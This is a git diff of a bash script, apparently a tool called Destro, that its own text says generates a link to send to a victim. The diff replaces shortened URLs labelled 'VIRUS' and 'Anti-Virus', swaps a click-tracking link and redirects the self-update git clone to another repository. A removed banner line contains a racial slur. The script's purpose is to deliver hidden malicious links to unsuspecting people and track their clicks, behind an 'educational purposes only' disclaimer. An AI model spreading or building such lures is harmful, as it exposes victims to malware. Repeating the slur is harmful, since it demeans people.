@@ -80,9 +80,9 @@ sleep 2
 echo
 echo -e "${grn}[ ! ]	Successfully Generated "
 echo
-echo -e "${blue}[ - ]	VIRUS :- shorturl.at/jtuJ6"
+echo -e "${blue}[ - ]	VIRUS :- https://cutt.ly/ewJW4HuF"
 echo
-echo -e "${pink} [ + ] Track the link clicks here :- https://www.shorturl.at/url-total-clicks.php?u=shorturl.at/jtuJ6 "
+echo -e "${pink} [ + ] Track the link clicks here :- https://cutt.ly/ewJW4HuF-stats30 "
 echo
 echo -e "${red} [ ! ] NOTE : Author is not responsible for any damages done by this script as it is for educational purposes only" | pv -qL 30
 echo
@@ -122,7 +122,7 @@ sleep 2
 echo
 echo -e "${grn}[ ! ]    Successfully Generated "
 echo
-echo -e "${blue}[ - ]   Anti-Virus :- https://cutt.ly/AntiVirus"
+echo -e "${blue}[ - ]   Anti-Virus :- https://cutt.ly/XwJW6nzL"
 echo
 echo -e "${red} [ ! ] NOTE : Author is not responsible for any damages done by this script as it is for educational purposes only" | pv -qL 30
 echo
@@ -176,7 +176,7 @@ echo -e "$grn			Updating $redDestro$grn press enter to continue$rset"
 read punch
 cd $HOME
 rm -rf Destro
-git clone https://github.com/Teekay-X/Destro
+git clone https://github.com/AsahlumaTy1ka/Destro
 clear
 echo -e "$grn              Destro is now uptodate$rset"
 echo
@@ -192,14 +192,14 @@ banner
 echo
 echo -e "$red		 Call Me $cyan TeekayX " | pv -qL 40
 echo -e "$red		I AM from the $cyan Mabhongo clan" | pv -qL 40
-echo -e "$red		 I AM a proud southafrican niqqa♠" | pv -qL 40
+echo -e "$red		 South African Kid 🇿🇦" | pv -qL 40
 sleep 2.0
 echo " "
 clear
 banner
 echo
-echo -e "$red killer-X" | pv -qL 40
-echo -e "$red killerX is a bash based script " | pv -qL 40
+echo -e "$red Destro" | pv -qL 40
+echo -e "$red Destro is a bash based script " | pv -qL 40
 echo -e "$red It generates a link and ypi send to victim" | pv -qL 40
 echo -e "$red HOPE YOU LIKE THE SCRIPT😅" | pv -qL 40
 echo " "
